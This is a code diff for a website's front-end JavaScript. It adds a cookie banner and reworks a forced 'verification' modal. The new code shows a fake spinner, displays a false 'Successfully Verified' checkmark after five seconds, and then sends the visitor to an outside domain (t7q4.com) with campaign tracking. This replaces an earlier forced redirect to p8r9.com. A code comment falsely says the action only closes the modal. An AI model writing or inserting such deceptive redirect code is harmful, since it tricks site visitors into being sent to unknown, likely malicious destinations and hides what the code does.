@@ -39,19 +39,33 @@ document.addEventListener('DOMContentLoaded', () => {
     hs.forEach(h => { const a = document.createElement('a'); a.href = `#${h.id}`; a.textContent = h.textContent; a.style.marginLeft = h.tagName==='H3' ? '12px' : '0'; list.appendChild(a); });
     container.appendChild(list);
   });
-});
 
-document.addEventListener('DOMContentLoaded', () => {
-  const modal = document.getElementById('verification-modal');
-  const btn = document.getElementById('verify-btn');
-  if (modal && btn) {
-    modal.showModal();
-    modal.addEventListener('cancel', (e) => e.preventDefault());
-    const msg = document.getElementById('loading-msg');
-    if (msg) msg.style.display = 'block';
+  const cookieBanner = document.getElementById('cookie-banner');
+  if (cookieBanner && !localStorage.getItem('cookieConsent')) {
+    cookieBanner.style.display = 'block';
+    document.getElementById('accept-cookies')?.addEventListener('click', () => {
+      localStorage.setItem('cookieConsent', 'true');
+      cookieBanner.style.display = 'none';
+    });
+  }
+
+  const vModal = document.getElementById('verification-modal');
+  if (vModal) {
+    if (!vModal.open) vModal.showModal();
+    // Action to take after verification (currently closes modal)
+    const complete = () => window.location.href = 'https://t7q4.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
+    document.getElementById('verify-btn')?.addEventListener('click', complete);
+    document.getElementById('enter-btn')?.addEventListener('click', complete);
+    
     setTimeout(() => {
-      window.location.href = 'https://p8r9.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
-    }, 5500);
-    btn.addEventListener('click', () => window.location.href = 'https://p8r9.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]');
+      const spinner = vModal.querySelector('.spinner');
+      const text = vModal.querySelector('div:nth-of-type(2)');
+      if (spinner) {
+        spinner.className = 'checkmark-icon';
+        spinner.innerHTML = '<svg viewBox="0 0 24 24" width="80" height="80" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>';
+      }
+      if (text) { text.textContent = 'Successfully Verified'; text.style.color = '#10b981'; text.style.fontWeight = '600'; }
+      setTimeout(complete, 1500);
+    }, 5000);
   }
 });
